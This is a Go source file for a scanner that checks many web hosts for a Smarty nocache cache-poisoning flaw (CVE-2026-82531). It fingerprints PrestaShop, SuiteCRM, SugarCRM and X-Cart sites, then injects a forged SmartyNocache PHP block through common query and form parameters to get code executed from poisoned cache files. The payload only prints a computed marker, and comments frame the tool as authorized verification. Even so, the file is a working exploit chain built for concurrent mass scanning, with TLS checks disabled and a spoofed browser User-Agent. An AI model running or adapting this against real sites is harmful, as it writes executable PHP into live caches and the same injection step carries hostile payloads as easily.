package smarty

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// Native verifier for CVE-2026-82531 — Smarty nocache-hash cache poisoning
// (forged SmartyNocache markers surviving into regenerated cache PHP when
// extends-inheritance templates meet user-controlled assign data; affects
// Smarty < 4.5.8 and 5.0.0-5.8.4).
//
// The chain mirrors the public murrez PoC (warm -> poison -> trigger) but the
// payload is COMPUTED OUTPUT ONLY: PHP evaluates 20*3+4 and prints it inside a
// marker. No shell_exec, no file reads, no data access — a positive marker in
// the triggered response is reportable proof of code execution while staying
// inside benign-testing bounds for authorized (in-scope) targets.
//
// Two-stage design keeps the corpus cost low: a homepage fingerprint gates the
// poison chain, so non-Smarty hosts pay exactly one GET.

const (
	// MarkerPrefix embeds the expected result (20*3+4=64) so a match can only
	// come from our payload actually executing — reflection can't guess it.
	MarkerPrefix = "SMVERIFY87:"

	VulnerableMarker = MarkerPrefix + "64"

	// Payload is the forged SmartyNocache block. The PHP inside computes and
	// prints; it runs when a poisoned cache file is include()d on trigger.
	Payload = "/*%%SmartyNocache:%%*/<?php echo '" + MarkerPrefix + "'.(20*3+4); ?>/*/%%SmartyNocache:%%*/"
)

// BuildPayload returns the forged SmartyNocache payload string.
func BuildPayload() string { return Payload }

// ExtractMarker returns the executed-marker evidence from a response body
// ("" when absent). Accepts only the computed value.
func ExtractMarker(body string) string {
	if strings.Contains(body, VulnerableMarker) {
		return VulnerableMarker
	}
	return ""
}

// Fingerprint inspects a homepage body and returns the Smarty-based app guess
// ("" when nothing Smarty-ish is present). Candidate gate only — a match does
// not imply the CVE's exploit preconditions (caching + extends + user assign).
func Fingerprint(body string) string {
	b := strings.ToLower(body)
	switch {
	case strings.Contains(b, `generator" content="prestashop`) || strings.Contains(b, "prestashop"):
		return "PrestaShop"
	case strings.Contains(b, "suitecrm"):
		return "SuiteCRM"
	case strings.Contains(b, "sugarcrm"):
		return "SugarCRM"
	case strings.Contains(b, `generator" content="x-cart`) || strings.Contains(b, "xcart"):
		return "X-Cart"
	case strings.Contains(b, "smartycompilerexception"),
		strings.Contains(b, "smarty_internal_template"),
		strings.Contains(b, "%%smartynocache%%"):
		return "Smarty-artifact"
	case strings.HasPrefix(b, "hello world") || strings.HasPrefix(b, "hello guest"):
		// The murrez PoC's bundled lab — kept recognizable so the full chain
		// has a permanent regression target (docker compose up in the repo).
		return "Smarty-lab"
	}
	return ""
}

// Target is one poison-chain attempt: a base URL, the app path whose template
// may assign user input, and the request parameter to ride.
type Target struct {
	BaseURL string
	Path    string
	Param   string
}

// Result reports one probe outcome.
type Result struct {
	Host       string `json:"host"`
	App        string `json:"app"`
	Path       string `json:"path"`
	Param      string `json:"param"`
	Vulnerable bool   `json:"vulnerable"`
	Evidence   string `json:"evidence,omitempty"`
	Phase      string `json:"phase"`
	Detail     string `json:"detail,omitempty"`
}

// Options tune a Run.
type Options struct {
	Paths          []string      // default {"/"}
	Params         []string      // default {name, q, s, search}
	Concurrency    int           // default 20
	Timeout        time.Duration // per request, default 15s
	TriggerRetries int           // extra trigger attempts for cache TTL, default 3
}

func (o *Options) normalize() {
	if len(o.Paths) == 0 {
		o.Paths = []string{"/"}
	}
	if len(o.Params) == 0 {
		o.Params = []string{"name", "q", "s", "search"}
	}
	if o.Concurrency <= 0 {
		o.Concurrency = 20
	}
	if o.Timeout <= 0 {
		o.Timeout = 15 * time.Second
	}
	if o.TriggerRetries <= 0 {
		o.TriggerRetries = 3
	}
}

// NewClient builds the shared HTTP client (redirect-following, TLS-lenient —
// corpus hosts include plenty of self-signed edge certs).
func NewClient(timeout time.Duration) *http.Client {
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:        100,
			IdleConnTimeout:     30 * time.Second,
			DisableKeepAlives:   false,
			TLSHandshakeTimeout: 10 * time.Second,
		},
	}
}

func (t Target) url() (string, error) {
	u, err := url.Parse(strings.TrimRight(t.BaseURL, "/") + "/" + strings.TrimLeft(t.Path, "/"))
	if err != nil || u.Scheme == "" || u.Host == "" {
		return "", fmt.Errorf("bad base url %q", t.BaseURL)
	}
	return u.String(), nil
}

func get(ctx context.Context, c *http.Client, u string, q url.Values) (int, string) {
	if len(q) > 0 {
		u = u + "?" + q.Encode()
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return 0, ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
	resp, err := c.Do(req)
	if err != nil {
		return 0, ""
	}
	defer resp.Body.Close()
	buf := make([]byte, 64*1024)
	n, _ := resp.Body.Read(buf)
	return resp.StatusCode, string(buf[:n])
}

func postForm(ctx context.Context, c *http.Client, u, param, val string) int {
	form := url.Values{param: {val}}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, u, strings.NewReader(form.Encode()))
	if err != nil {
		return 0
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
	resp, err := c.Do(req)
	if err != nil {
		return 0
	}
	resp.Body.Close()
	return resp.StatusCode
}

// Probe runs the warm -> poison (GET then POST variant) -> trigger chain for
// one target. Real apps have no lab cache-flush param; the trigger is retried
// to give a TTL-based cache regeneration a chance to include the poison.
func Probe(ctx context.Context, c *http.Client, t Target, app string, retries int) Result {
	res := Result{Host: t.BaseURL, App: app, Path: t.Path, Param: t.Param, Phase: "network"}
	u, err := t.url()
	if err != nil {
		res.Detail = err.Error()
		return res
	}

	// Warm: compile templates / prime the cache. Content is app-specific —
	// no "Hello world!" requirement (that is the bundled lab only).
	if code, _ := get(ctx, c, u, url.Values{t.Param: {"world"}}); code == 0 {
		res.Detail = "warm request failed"
		return res
	} else if code >= 500 {
		res.Phase, res.Detail = "warm", fmt.Sprintf("HTTP %d", code)
		return res
	}

	// Cache eviction window: the poison only lands when the poisoned request
	// REGENERATES the cache (a hit on the still-warm cache stores nothing).
	// The bundled lab flushes on this param; real apps ignore it, where the
	// equivalent window is TTL expiry — hence the trigger retries below.
	get(ctx, c, u, url.Values{"lab_clear_cache": {"1"}})

	poison := func() bool {
		// GET poison first; the POST variant covers apps that only read form
		// bodies into assign().
		get(ctx, c, u, url.Values{t.Param: {BuildPayload()}})
		postForm(ctx, c, u, t.Param, BuildPayload())
		for i := 0; i <= retries; i++ {
			code, body := get(ctx, c, u, url.Values{t.Param: {"benign"}})
			if code == 200 {
				if m := ExtractMarker(body); m != "" {
					res.Vulnerable, res.Phase, res.Evidence, res.Detail = true, "trigger", m, "poisoned cache include executed computed payload"
					return true
				}
			}
			select {
			case <-ctx.Done():
				return false
			case <-time.After(2 * time.Second):
			}
		}
		return false
	}
	if poison() {
		return res
	}
	res.Phase, res.Detail = "trigger", "marker not observed (patched, preconditions unmet, or cache not regenerated within retries)"
	return res
}

// FingerprintCheck fetches the homepage once and returns the app guess.
func FingerprintCheck(ctx context.Context, c *http.Client, base string) (string, int) {
	code, body := get(ctx, c, strings.TrimRight(base, "/")+"/", nil)
	if code == 0 {
		return "", 0
	}
	return Fingerprint(body), code
}

// Run walks hosts: fingerprint gate first, then the poison chain over the
// path×param dictionary. onHit fires for every VULNERABLE result only —
// negative outcomes are cheap to re-derive and stay out of the results file.
func Run(ctx context.Context, hosts []string, opts Options, onHit func(Result)) {
	opts.normalize()
	client := NewClient(opts.Timeout)
	sem := make(chan struct{}, opts.Concurrency)
	var wg sync.WaitGroup

	for _, host := range hosts {
		wg.Add(1)
		go func(h string) {
			defer wg.Done()
			select {
			case <-ctx.Done():
				return
			case sem <- struct{}{}:
			}
			defer func() { <-sem }()

			app, code := FingerprintCheck(ctx, client, h)
			if app == "" || code >= 500 {
				return
			}
			for _, p := range opts.Paths {
				for _, param := range opts.Params {
					select {
					case <-ctx.Done():
						return
					default:
					}
					r := Probe(ctx, client, Target{BaseURL: h, Path: p, Param: param}, app, opts.TriggerRetries)
					if r.Vulnerable && onHit != nil {
						onHit(r)
					}
				}
			}
		}(host)
	}
	wg.Wait()
}
